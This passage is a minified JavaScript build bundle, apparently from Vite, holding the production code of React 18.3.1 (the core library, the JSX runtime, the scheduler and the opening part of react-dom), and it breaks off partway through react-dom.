function Kc(e,n){for(var t=0;t<n.length;t++){const r=n[t];if(typeof r!="string"&&!Array.isArray(r)){for(const i in r)if(i!=="default"&&!(i in e)){const l=Object.getOwnPropertyDescriptor(r,i);l&&Object.defineProperty(e,i,l.get?l:{enumerable:!0,get:()=>r[i]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const l of i)if(l.type==="childList")for(const o of l.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function t(i){const l={};return i.integrity&&(l.integrity=i.integrity),i.referrerPolicy&&(l.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?l.credentials="include":i.crossOrigin==="anonymous"?l.credentials="omit":l.credentials="same-origin",l}function r(i){if(i.ep)return;i.ep=!0;const l=t(i);fetch(i.href,l)}})();function Yc(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var xa={exports:{}},pi={},Sa={exports:{}},j={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var ir=Symbol.for("react.element"),Xc=Symbol.for("react.portal"),qc=Symbol.for("react.fragment"),Jc=Symbol.for("react.strict_mode"),Zc=Symbol.for("react.profiler"),ed=Symbol.for("react.provider"),nd=Symbol.for("react.context"),td=Symbol.for("react.forward_ref"),rd=Symbol.for("react.suspense"),id=Symbol.for("react.memo"),ld=Symbol.for("react.lazy"),ts=Symbol.iterator;function od(e){return e===null||typeof e!="object"?null:(e=ts&&e[ts]||e["@@iterator"],typeof e=="function"?e:null)}var ba={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},Ea=Object.assign,Ca={};function ft(e,n,t){this.props=e,this.context=n,this.refs=Ca,this.updater=t||ba}ft.prototype.isReactComponent={};ft.prototype.setState=function(e,n){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,n,"setState")};ft.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function Ta(){}Ta.prototype=ft.prototype;function ro(e,n,t){this.props=e,this.context=n,this.refs=Ca,this.updater=t||ba}var io=ro.prototype=new Ta;io.constructor=ro;Ea(io,ft.prototype);io.isPureReactComponent=!0;var rs=Array.isArray,Pa=Object.prototype.hasOwnProperty,lo={current:null},_a={key:!0,ref:!0,__self:!0,__source:!0};function Na(e,n,t){var r,i={},l=null,o=null;if(n!=null)for(r in n.ref!==void 0&&(o=n.ref),n.key!==void 0&&(l=""+n.key),n)Pa.call(n,r)&&!_a.hasOwnProperty(r)&&(i[r]=n[r]);var s=arguments.length-2;if(s===1)i.children=t;else if(1<s){for(var a=Array(s),c=0;c<s;c++)a[c]=arguments[c+2];i.children=a}if(e&&e.defaultProps)for(r in s=e.defaultProps,s)i[r]===void 0&&(i[r]=s[r]);return{$$typeof:ir,type:e,key:l,ref:o,props:i,_owner:lo.current}}function sd(e,n){return{$$typeof:ir,type:e.type,key:n,ref:e.ref,props:e.props,_owner:e._owner}}function oo(e){return typeof e=="object"&&e!==null&&e.$$typeof===ir}function ad(e){var n={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(t){return n[t]})}var is=/\/+/g;function Ai(e,n){return typeof e=="object"&&e!==null&&e.key!=null?ad(""+e.key):n.toString(36)}function Lr(e,n,t,r,i){var l=typeof e;(l==="undefined"||l==="boolean")&&(e=null);var o=!1;if(e===null)o=!0;else switch(l){case"string":case"number":o=!0;break;case"object":switch(e.$$typeof){case ir:case Xc:o=!0}}if(o)return o=e,i=i(o),e=r===""?"."+Ai(o,0):r,rs(i)?(t="",e!=null&&(t=e.replace(is,"$&/")+"/"),Lr(i,n,t,"",function(c){return c})):i!=null&&(oo(i)&&(i=sd(i,t+(!i.key||o&&o.key===i.key?"":(""+i.key).replace(is,"$&/")+"/")+e)),n.push(i)),1;if(o=0,r=r===""?".":r+":",rs(e))for(var s=0;s<e.length;s++){l=e[s];var a=r+Ai(l,s);o+=Lr(l,n,t,a,i)}else if(a=od(e),typeof a=="function")for(e=a.call(e),s=0;!(l=e.next()).done;)l=l.value,a=r+Ai(l,s++),o+=Lr(l,n,t,a,i);else if(l==="object")throw n=String(e),Error("Objects are not valid as a React child (found: "+(n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n)+"). If you meant to render a collection of children, use an array instead.");return o}function pr(e,n,t){if(e==null)return e;var r=[],i=0;return Lr(e,r,"","",function(l){return n.call(t,l,i++)}),r}function ud(e){if(e._status===-1){var n=e._result;n=n(),n.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=n)}if(e._status===1)return e._result.default;throw e._result}var ue={current:null},Or={transition:null},cd={ReactCurrentDispatcher:ue,ReactCurrentBatchConfig:Or,ReactCurrentOwner:lo};function La(){throw Error("act(...) is not supported in production builds of React.")}j.Children={map:pr,forEach:function(e,n,t){pr(e,function(){n.apply(this,arguments)},t)},count:function(e){var n=0;return pr(e,function(){n++}),n},toArray:function(e){return pr(e,function(n){return n})||[]},only:function(e){if(!oo(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};j.Component=ft;j.Fragment=qc;j.Profiler=Zc;j.PureComponent=ro;j.StrictMode=Jc;j.Suspense=rd;j.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=cd;j.act=La;j.cloneElement=function(e,n,t){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var r=Ea({},e.props),i=e.key,l=e.ref,o=e._owner;if(n!=null){if(n.ref!==void 0&&(l=n.ref,o=lo.current),n.key!==void 0&&(i=""+n.key),e.type&&e.type.defaultProps)var s=e.type.defaultProps;for(a in n)Pa.call(n,a)&&!_a.hasOwnProperty(a)&&(r[a]=n[a]===void 0&&s!==void 0?s[a]:n[a])}var a=arguments.length-2;if(a===1)r.children=t;else if(1<a){s=Array(a);for(var c=0;c<a;c++)s[c]=arguments[c+2];r.children=s}return{$$typeof:ir,type:e.type,key:i,ref:l,props:r,_owner:o}};j.createContext=function(e){return e={$$typeof:nd,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:ed,_context:e},e.Consumer=e};j.createElement=Na;j.createFactory=function(e){var n=Na.bind(null,e);return n.type=e,n};j.createRef=function(){return{current:null}};j.forwardRef=function(e){return{$$typeof:td,render:e}};j.isValidElement=oo;j.lazy=function(e){return{$$typeof:ld,_payload:{_status:-1,_result:e},_init:ud}};j.memo=function(e,n){return{$$typeof:id,type:e,compare:n===void 0?null:n}};j.startTransition=function(e){var n=Or.transition;Or.transition={};try{e()}finally{Or.transition=n}};j.unstable_act=La;j.useCallback=function(e,n){return ue.current.useCallback(e,n)};j.useContext=function(e){return ue.current.useContext(e)};j.useDebugValue=function(){};j.useDeferredValue=function(e){return ue.current.useDeferredValue(e)};j.useEffect=function(e,n){return ue.current.useEffect(e,n)};j.useId=function(){return ue.current.useId()};j.useImperativeHandle=function(e,n,t){return ue.current.useImperativeHandle(e,n,t)};j.useInsertionEffect=function(e,n){return ue.current.useInsertionEffect(e,n)};j.useLayoutEffect=function(e,n){return ue.current.useLayoutEffect(e,n)};j.useMemo=function(e,n){return ue.current.useMemo(e,n)};j.useReducer=function(e,n,t){return ue.current.useReducer(e,n,t)};j.useRef=function(e){return ue.current.useRef(e)};j.useState=function(e){return ue.current.useState(e)};j.useSyncExternalStore=function(e,n,t){return ue.current.useSyncExternalStore(e,n,t)};j.useTransition=function(){return ue.current.useTransition()};j.version="18.3.1";Sa.exports=j;var S=Sa.exports;const Oa=Yc(S),dd=Kc({__proto__:null,default:Oa},[S]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var fd=S,pd=Symbol.for("react.element"),hd=Symbol.for("react.fragment"),md=Object.prototype.hasOwnProperty,gd=fd.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,vd={key:!0,ref:!0,__self:!0,__source:!0};function ja(e,n,t){var r,i={},l=null,o=null;t!==void 0&&(l=""+t),n.key!==void 0&&(l=""+n.key),n.ref!==void 0&&(o=n.ref);for(r in n)md.call(n,r)&&!vd.hasOwnProperty(r)&&(i[r]=n[r]);if(e&&e.defaultProps)for(r in n=e.defaultProps,n)i[r]===void 0&&(i[r]=n[r]);return{$$typeof:pd,type:e,key:l,ref:o,props:i,_owner:gd.current}}pi.Fragment=hd;pi.jsx=ja;pi.jsxs=ja;xa.exports=pi;var u=xa.exports,Ra={exports:{}},ke={},Aa={exports:{}},Ma={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function n(T,L){var O=T.length;T.push(L);e:for(;0<O;){var $=O-1>>>1,q=T[$];if(0<i(q,L))T[$]=L,T[O]=q,O=$;else break e}}function t(T){return T.length===0?null:T[0]}function r(T){if(T.length===0)return null;var L=T[0],O=T.pop();if(O!==L){T[0]=O;e:for(var $=0,q=T.length,dr=q>>>1;$<dr;){var Sn=2*($+1)-1,Ri=T[Sn],bn=Sn+1,fr=T[bn];if(0>i(Ri,O))bn<q&&0>i(fr,Ri)?(T[$]=fr,T[bn]=O,$=bn):(T[$]=Ri,T[Sn]=O,$=Sn);else if(bn<q&&0>i(fr,O))T[$]=fr,T[bn]=O,$=bn;else break e}}return L}function i(T,L){var O=T.sortIndex-L.sortIndex;return O!==0?O:T.id-L.id}if(typeof performance=="object"&&typeof performance.now=="function"){var l=performance;e.unstable_now=function(){return l.now()}}else{var o=Date,s=o.now();e.unstable_now=function(){return o.now()-s}}var a=[],c=[],g=1,h=null,m=3,v=!1,w=!1,k=!1,E=typeof setTimeout=="function"?setTimeout:null,f=typeof clearTimeout=="function"?clearTimeout:null,d=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function p(T){for(var L=t(c);L!==null;){if(L.callback===null)r(c);else if(L.startTime<=T)r(c),L.sortIndex=L.expirationTime,n(a,L);else break;L=t(c)}}function y(T){if(k=!1,p(T),!w)if(t(a)!==null)w=!0,Oi(b);else{var L=t(c);L!==null&&ji(y,L.startTime-T)}}function b(T,L){w=!1,k&&(k=!1,f(N),N=-1),v=!0;var O=m;try{for(p(L),h=t(a);h!==null&&(!(h.expirationTime>L)||T&&!_e());){var $=h.callback;if(typeof $=="function"){h.callback=null,m=h.priorityLevel;var q=$(h.expirationTime<=L);L=e.unstable_now(),typeof q=="function"?h.callback=q:h===t(a)&&r(a),p(L)}else r(a);h=t(a)}if(h!==null)var dr=!0;else{var Sn=t(c);Sn!==null&&ji(y,Sn.startTime-L),dr=!1}return dr}finally{h=null,m=O,v=!1}}var P=!1,_=null,N=-1,W=5,R=-1;function _e(){return!(e.unstable_now()-R<W)}function gt(){if(_!==null){var T=e.unstable_now();R=T;var L=!0;try{L=_(!0,T)}finally{L?vt():(P=!1,_=null)}}else P=!1}var vt;if(typeof d=="function")vt=function(){d(gt)};else if(typeof MessageChannel<"u"){var ns=new MessageChannel,Qc=ns.port2;ns.port1.onmessage=gt,vt=function(){Qc.postMessage(null)}}else vt=function(){E(gt,0)};function Oi(T){_=T,P||(P=!0,vt())}function ji(T,L){N=E(function(){T(e.unstable_now())},L)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(T){T.callback=null},e.unstable_continueExecution=function(){w||v||(w=!0,Oi(b))},e.unstable_forceFrameRate=function(T){0>T||125<T?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):W=0<T?Math.floor(1e3/T):5},e.unstable_getCurrentPriorityLevel=function(){return m},e.unstable_getFirstCallbackNode=function(){return t(a)},e.unstable_next=function(T){switch(m){case 1:case 2:case 3:var L=3;break;default:L=m}var O=m;m=L;try{return T()}finally{m=O}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(T,L){switch(T){case 1:case 2:case 3:case 4:case 5:break;default:T=3}var O=m;m=T;try{return L()}finally{m=O}},e.unstable_scheduleCallback=function(T,L,O){var $=e.unstable_now();switch(typeof O=="object"&&O!==null?(O=O.delay,O=typeof O=="number"&&0<O?$+O:$):O=$,T){case 1:var q=-1;break;case 2:q=250;break;case 5:q=1073741823;break;case 4:q=1e4;break;default:q=5e3}return q=O+q,T={id:g++,callback:L,priorityLevel:T,startTime:O,expirationTime:q,sortIndex:-1},O>$?(T.sortIndex=O,n(c,T),t(a)===null&&T===t(c)&&(k?(f(N),N=-1):k=!0,ji(y,O-$))):(T.sortIndex=q,n(a,T),w||v||(w=!0,Oi(b))),T},e.unstable_shouldYield=_e,e.unstable_wrapCallback=function(T){var L=m;return function(){var O=m;m=L;try{return T.apply(this,arguments)}finally{m=O}}}})(Ma);Aa.exports=Ma;var yd=Aa.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var wd=S,we=yd;function x(e){for(var n="https://reactjs.org/docs/error-decoder.html?invariant="+e,t=1;t<arguments.length;t++)n+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+e+"; visit "+n+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var Ia=new Set,Bt={};function Dn(e,n){lt(e,n),lt(e+"Capture",n)}function lt(e,n){for(Bt[e]=n,e=0;e<n.length;e++)Ia.add(n[e])}var Qe=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),sl=Object.prototype.hasOwnProperty,kd=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,ls={},os={};function xd(e){return sl.call(os,e)?!0:sl.call(ls,e)?!1:kd.test(e)?os[e]=!0:(ls[e]=!0,!1)}function Sd(e,n,t,r){if(t!==null&&t.type===0)return!1;switch(typeof n){case"function":case"symbol":return!0;case"boolean":return r?!1:t!==null?!t.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function bd(e,n,t,r){if(n===null||typeof n>"u"||Sd(e,n,t,r))return!0;if(r)return!1;if(t!==null)switch(t.type){case 3:return!n;case 4:return n===!1;case 5:return isNaN(n);case 6:return isNaN(n)||1>n}return!1}function ce(e,n,t,r,i,l,o){this.acceptsBooleans=n===2||n===3||n===4,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=t,this.propertyName=e,this.type=n,this.sanitizeURL=l,this.removeEmptyString=o}var te={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){te[e]=new ce(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var n=e[0];te[n]=new ce(n,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){te[e]=new ce(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){te[e]=new ce(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){te[e]=new ce(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){te[e]=new ce(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){te[e]=new ce(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){te[e]=new ce(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){te[e]=new ce(e,5,!1,e.toLowerCase(),null,!1,!1)});var so=/[\-:]([a-z])/g;function ao(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var n=e.replace(so,ao);te[n]=new ce(n,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var n=e.replace(so,ao);te[n]=new ce(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var n=e.replace(so,ao);te[n]=new ce(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){te[e]=new ce(e,1,!1,e.toLowerCase(),null,!1,!1)});te.xlinkHref=new ce("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){te[e]=new ce(e,1,!1,e.toLowerCase(),null,!0,!0)});function uo(e,n,t,r){var i=te.hasOwnProperty(n)?te[n]:null;(i!==null?i.type!==0:r||!(2<n.length)||n[0]!=="o"&&n[0]!=="O"||n[1]!=="n"&&n[1]!=="N")&&(bd(n,t,i,r)&&(t=null),r||i===null?xd(n)&&(t===null?e.removeAttribute(n):e.setAttribute(n,""+t)):i.mustUseProperty?e[i.propertyName]=t===null?i.type===3?!1:"":t:(n=i.attributeName,r=i.attributeNamespace,t===null?e.removeAttribute(n):(i=i.type,t=i===3||i===4&&t===!0?"":""+t,r?e.setAttributeNS(r,n,t):e.setAttribute(n,t))))}var qe=wd.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,hr=Symbol.for("react.element"),Un=Symbol.for("react.portal"),Hn=Symbol.for("react.fragment"),co=Symbol.for("react.strict_mode"),al=Symbol.for("react.profiler"),Da=Symbol.for("react.provider"),za=Symbol.for("react.context"),fo=Symbol.for("react.forward_ref"),ul=Symbol.for("react.suspense"),cl=Symbol.for("react.suspense_list"),po=Symbol.for("react.memo"),Ze=Symbol.for("react.lazy"),Ba=Symbol.for("react.offscreen"),ss=Symbol.iterator;function yt(e){return e===null||typeof e!="object"?null:(e=ss&&e[ss]||e["@@iterator"],typeof e=="function"?e:null)}var H=Object.assign,Mi;function Tt(e){if(Mi===void 0)try{throw Error()}catch(t){var n=t.stack.trim().match(/\n( *(at )?)/);Mi=n&&n[1]||""}return`
`+Mi+e}var Ii=!1;function Di(e,n){if(!e||Ii)return"";Ii=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(n)if(n=function(){throw Error()},Object.defineProperty(n.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(n,[])}catch(c){var r=c}Reflect.construct(e,[],n)}else{try{n.call()}catch(c){r=c}e.call(n.prototype)}else{try{throw Error()}catch(c){r=c}e()}}catch(c){if(c&&r&&typeof c.stack=="string"){for(var i=c.stack.split(`
`),l=r.stack.split(`
`),o=i.length-1,s=l.length-1;1<=o&&0<=s&&i[o]!==l[s];)s--;for(;1<=o&&0<=s;o--,s--)if(i[o]!==l[s]){if(o!==1||s!==1)do if(o--,s--,0>s||i[o]!==l[s]){var a=`
`+i[o].replace(" at new "," at ");return e.displayName&&a.includes("<anonymous>")&&(a=a.replace("<anonymous>",e.displayName)),a}while(1<=o&&0<=s);break}}}finally{Ii=!1,Error.prepareStackTrace=t}return(e=e?e.displayName||e.name:"")?Tt(e):""}function Ed(e){switch(e.tag){case 5:return Tt(e.type);case 16:return Tt("Lazy");case 13:return Tt("Suspense");case 19:return Tt("SuspenseList");case 0:case 2:case 15:return e=Di(e.type,!1),e;case 11:return e=Di(e.type.render,!1),e;case 1:return e=Di(e.type,!0),e;default:return""}}function dl(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case Hn:return"Fragment";case Un:return"Portal";case al:return"Profiler";case co:return"StrictMode";case ul:return"Suspense";case cl:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case za:return(e.displayName||"Context")+".Consumer";case Da:return(e._context.displayName||"Context")+".Provider";case fo:var n=e.render;return e=e.displayName,e||(e=n.displayName||n.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case po:return n=e.displayName||null,n!==null?n:dl(e.type)||"Memo";case Ze:n=e._payload,e=e._init;try{return dl(e(n))}catch{}}return null}function Cd(e){var n=e.type;switch(e.tag){case 24:return"Cache";case 9:return(n.displayName||"Context")+".Consumer";case 10:return(n._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=n.render,e=e.displayName||e.name||"",n.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return n;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return dl(n);case 8:return n===co?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n}return null}function gn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Fa(e){var n=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function Td(e){var n=Fa(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,n),r=""+e[n];if(!e.hasOwnProperty(n)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var i=t.get,l=t.set;return Object.defineProperty(e,n,{configurable:!0,get:function(){return i.call(this)},set:function(o){r=""+o,l.call(this,o)}}),Object.defineProperty(e,n,{enumerable:t.enumerable}),{getValue:function(){return r},setValue:function(o){r=""+o},stopTracking:function(){e._valueTracker=null,delete e[n]}}}}function mr(e){e._valueTracker||(e._valueTracker=Td(e))}function Ua(e){if(!e)return!1;var n=e._valueTracker;if(!n)return!0;var t=n.getValue(),r="";return e&&(r=Fa(e)?e.checked?"true":"false":e.value),e=r,e!==t?(n.setValue(e),!0):!1}function Hr(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function fl(e,n){var t=n.checked;return H({},n,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??e._wrapperState.initialChecked})}function as(e,n){var t=n.defaultValue==null?"":n.defaultValue,r=n.checked!=null?n.checked:n.defaultChecked;t=gn(n.value!=null?n.value:t),e._wrapperState={initialChecked:r,initialValue:t,controlled:n.type==="checkbox"||n.type==="radio"?n.checked!=null:n.value!=null}}function Ha(e,n){n=n.checked,n!=null&&uo(e,"checked",n,!1)}function pl(e,n){Ha(e,n);var t=gn(n.value),r=n.type;if(t!=null)r==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+t):e.value!==""+t&&(e.value=""+t);else if(r==="submit"||r==="reset"){e.removeAttribute("value");return}n.hasOwnProperty("value")?hl(e,n.type,t):n.hasOwnProperty("defaultValue")&&hl(e,n.type,gn(n.defaultValue)),n.checked==null&&n.defaultChecked!=null&&(e.defaultChecked=!!n.defaultChecked)}function us(e,n,t){if(n.hasOwnProperty("value")||n.hasOwnProperty("defaultValue")){var r=n.type;if(!(r!=="submit"&&r!=="reset"||n.value!==void 0&&n.value!==null))return;n=""+e._wrapperState.initialValue,t||n===e.value||(e.value=n),e.defaultValue=n}t=e.name,t!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,t!==""&&(e.name=t)}function hl(e,n,t){(n!=="number"||Hr(e.ownerDocument)!==e)&&(t==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+t&&(e.defaultValue=""+t))}var Pt=Array.isArray;function Zn(e,n,t,r){if(e=e.options,n){n={};for(var i=0;i<t.length;i++)n["$"+t[i]]=!0;for(t=0;t<e.length;t++)i=n.hasOwnProperty("$"+e[t].value),e[t].selected!==i&&(e[t].selected=i),i&&r&&(e[t].defaultSelected=!0)}else{for(t=""+gn(t),n=null,i=0;i<e.length;i++){if(e[i].value===t){e[i].selected=!0,r&&(e[i].defaultSelected=!0);return}n!==null||e[i].disabled||(n=e[i])}n!==null&&(n.selected=!0)}}function ml(e,n){if(n.dangerouslySetInnerHTML!=null)throw Error(x(91));return H({},n,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function cs(e,n){var t=n.value;if(t==null){if(t=n.children,n=n.defaultValue,t!=null){if(n!=null)throw Error(x(92));if(Pt(t)){if(1<t.length)throw Error(x(93));t=t[0]}n=t}n==null&&(n=""),t=n}e._wrapperState={initialValue:gn(t)}}function Va(e,n){var t=gn(n.value),r=gn(n.defaultValue);t!=null&&(t=""+t,t!==e.value&&(e.value=t),n.defaultValue==null&&e.defaultValue!==t&&(e.defaultValue=t)),r!=null&&(e.defaultValue=""+r)}function ds(e){var n=e.textContent;n===e._wrapperState.initialValue&&n!==""&&n!==null&&(e.value=n)}function Wa(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function gl(e,n){return e==null||e==="http://www.w3.org/1999/xhtml"?Wa(n):e==="http://www.w3.org/2000/svg"&&n==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var gr,$a=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(n,t,r,i){MSApp.execUnsafeLocalFunction(function(){return e(n,t,r,i)})}:e}(function(e,n){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=n;else{for(gr=gr||document.createElement("div"),gr.innerHTML="<svg>"+n.valueOf().toString()+"</svg>",n=gr.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;n.firstChild;)e.appendChild(n.firstChild)}});function Ft(e,n){if(n){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=n;return}}e.textContent=n}var Lt={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Pd=["Webkit","ms","Moz","O"];Object.keys(Lt).forEach(function(e){Pd.forEach(function(n){n=n+e.charAt(0).toUpperCase()+e.substring(1),Lt[n]=Lt[e]})});function Ga(e,n,t){return n==null||typeof n=="boolean"||n===""?"":t||typeof n!="number"||n===0||Lt.hasOwnProperty(e)&&Lt[e]?(""+n).trim():n+"px"}function Qa(e,n){e=e.style;for(var t in n)if(n.hasOwnProperty(t)){var r=t.indexOf("--")===0,i=Ga(t,n[t],r);t==="float"&&(t="cssFloat"),r?e.setProperty(t,i):e[t]=i}}var _d=H({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function vl(e,n){if(n){if(_d[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw 